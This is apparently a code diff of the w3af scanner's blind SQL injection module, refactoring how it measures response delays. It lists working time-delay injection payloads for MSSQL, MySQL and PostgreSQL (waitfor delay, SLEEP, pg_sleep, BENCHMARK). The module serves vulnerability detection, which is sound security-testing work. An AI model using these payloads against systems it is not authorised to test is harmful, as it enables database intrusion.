@@ -20,121 +20,80 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
 import core.controllers.outputManager as om
-import core.data.constants.dbms as dbms
 import core.data.constants.severity as severity
 import core.data.kb.vuln as vuln
 
-from core.controllers.basePlugin.basePlugin import basePlugin
+from core.controllers.delay_detection.exact_delay import exact_delay
+from core.controllers.delay_detection.delay import delay
 from core.data.fuzzer.fuzzer import createMutants
 
 
-class blind_sqli_time_delay(basePlugin):
+
+class blind_sqli_time_delay(object):
     '''
-    This class tests for blind SQL injection bugs using time delays, 
-    the logic is here and not as an audit plugin because this logic is also used in attack plugins.
+    This class tests for blind SQL injection bugs using time delays, the logic
+    is here and not as an audit plugin because this logic is also used in 
+    attack plugins.
     
     @author: Andres Riancho ( andres.riancho@gmail.com )
     '''
 
-    def __init__(self):
-        # ""I'm a plugin""
-        basePlugin.__init__(self)
+    def __init__(self, uri_opener):
+        self._uri_opener = uri_opener
         
-        # The wait time of the first test I'm going to perform
-        self._wait_time = 4
-        
-    def is_injectable( self, freq, parameter ):
+    def is_injectable( self, mutant ):
         '''
-        Check if "parameter" of the fuzzable request object is injectable or not.
+        Check if this mutant is delay injectable or not.
         
-        @freq: The fuzzableRequest object that I have to modify
-        @parameter: A string with the parameter name to test
-        
+        @mutant: The mutant object that I have to inject to
         @return: A vulnerability object or None if nothing is found
         '''
-        #
-        #    Setup
-        #
-        
-        # First save the original wait time
-        original_wait_time = self._get_original_time(freq, rep=3)
-        
-        # Create the mutants
-        statement_list = self._get_statements()
-        sql_commands_only = [ i.sql_command for i in statement_list ]
-        mutants = createMutants( freq , sql_commands_only, fuzzableParamList=[parameter, ] )
-        
-        # And now I assign the statement to the mutant
-        for statement in statement_list:
-            for mutant in mutants:
-                if statement.sql_command in mutant.getModValue():
-                    mutant.statement = statement.sql_command
-                    mutant.dbms = statement.dbms
-        
-        #
-        #    Run the tests
-        #
-        for mutant in mutants:
+        for delay_obj in self._get_delays():
             
-            response = self._sendMutant( mutant, analyze=False, useCache=False )
-            if response.getWaitTime() > (original_wait_time + self._wait_time - 0.5):
+            ed = exact_delay(mutant, delay_obj, self._uri_opener)
+            success, responses = ed.delay_is_controlled()
+            
+            if success:
+                # Now I can be sure that I found a vuln, we control the response
+                # time with the delay
+                v = vuln.vuln( mutant )
+                v.setName( 'Blind SQL injection vulnerability' )
+                v.setSeverity(severity.HIGH)
+                desc = 'Blind SQL injection using time delays was found at: %s'
+                desc = desc % mutant.foundAt()
+                v.setDesc( desc )
+                v.setDc( mutant.getDc() )
+                v.setId( [r.id for r in responses ] )
+                v.setURI( r.getURI() )
                 
-                # Re-send the same request to verify that this wasn't because of
-                # network delay or some other rare thing
-                original_wait_time = self._get_original_time(freq, rep=3)
-                response = self._sendMutant( mutant, analyze=False, useCache=False )
-
-                if response.getWaitTime() > (original_wait_time + self._wait_time - 0.5):
-                    
-                    # Now I can be sure that I found a vuln, w3 control the response
-                    # time with the delay
-                    v = vuln.vuln( mutant )
-                    v.setName( 'Blind SQL injection - ' + mutant.dbms )
-                    v.setSeverity(severity.HIGH)
-                    v.setDesc( 'Blind SQL injection was found at: ' + mutant.foundAt() )
-                    v.setDc( mutant.getDc() )
-                    v.setId( response.id )
-                    v.setURI( response.getURI() )
-                    
-                    om.out.debug( v.getDesc() )
-
-                    return v
+                om.out.debug( v.getDesc() )
+    
+                return v
                 
         return None
     
-    def _get_original_time(self, freq, rep=3):
-        original_wait_times = []
-        
-        for _ in xrange(rep):
-            time = self._sendMutant( freq, analyze=False, useCache=False ).getWaitTime()
-            original_wait_times.append(time)
-        
-        return float(sum(original_wait_times)) / len(original_wait_times)
-    
-    def _get_statements( self ):
+    def _get_delays( self ):
         '''
         @return: A list of statements that are going to be used to test for
-        blind SQL injections. The statements are objects.
+                 blind SQL injections. The statements are objects.
         '''
         res = []
         
-        delay = self._wait_time
-        
         # MSSQL
-        res.append( statement("1;waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
-        res.append( statement("1);waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
-        res.append( statement("1));waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
-        res.append( statement("1';waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
-        res.append( statement("1');waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
-        res.append( statement("1'));waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
+        res.append( delay("1;waitfor delay '0:0:%s'--") )
+        res.append( delay("1);waitfor delay '0:0:%s'--") )
+        res.append( delay("1));waitfor delay '0:0:%s'--") )
+        res.append( delay("1';waitfor delay '0:0:%s'--") )
+        res.append( delay("1');waitfor delay '0:0:%s'--") )
+        res.append( delay("1'));waitfor delay '0:0:%s'--") )
 
         # MySQL 5
         #
         # Thank you guys for adding sleep(seconds) !
         #
-        res.append( statement("1 or SLEEP(%s)" % delay, dbms.MYSQL) )
-        res.append( statement("1' or SLEEP(%s) or '1'='1" % delay, dbms.MYSQL) )
-        res.append( statement('1" or SLEEP(%s) or "1"="1' % delay, dbms.MYSQL) )
+        res.append( delay("1 or SLEEP(%s)") )
+        res.append( delay("1' or SLEEP(%s) and '1'='1") )
+        res.append( delay('1" or SLEEP(%s) and "1"="1') )
         
         # MySQL 4
         # 
@@ -149,21 +108,21 @@ class blind_sqli_time_delay(basePlugin):
         #
         # With a small wait time of 5 seconds, this should work without problems...
         # and without hitting the xUrllib timeout !
-        res.append( statement("1 or BENCHMARK(2500000,MD5(1))", dbms.MYSQL) )
-        res.append( statement("1' or BENCHMARK(2500000,MD5(1)) or '1'='1", dbms.MYSQL) )
-        res.append( statement('1" or BENCHMARK(2500000,MD5(1)) or "1"="1', dbms.MYSQL) )
+        # 
+        #    TODO: Need to implement variable_delay.py (modification of exact_delay)
+        #          and use the following there:
+        #
+        #res.append( delay("1 or BENCHMARK(2500000,MD5(1))") )
+        #res.append( delay("1' or BENCHMARK(2500000,MD5(1)) or '1'='1") )
+        #res.append( delay('1" or BENCHMARK(2500000,MD5(1)) or "1"="1') )
               
         # PostgreSQL
-        res.append( statement("1 or pg_sleep(%s)" % delay, dbms.POSTGRE) )
-        res.append( statement("1' or pg_sleep(%s) or '1'='1" % delay, dbms.POSTGRE) )
-        res.append( statement('1" or pg_sleep(%s) or "1"="1' % delay, dbms.POSTGRE) )
+        res.append( delay("1 or pg_sleep(%s)") )
+        res.append( delay("1' or pg_sleep(%s) or '1'='1") )
+        res.append( delay('1" or pg_sleep(%s) or "1"="1') )
         
         # TODO: Add Oracle support
         # TODO: Add XXXXX support
         
         return res
-        
-class statement(object):
-    def __init__(self, sql_command, dbms):
-        self.sql_command = sql_command
-        self.dbms = dbms
+
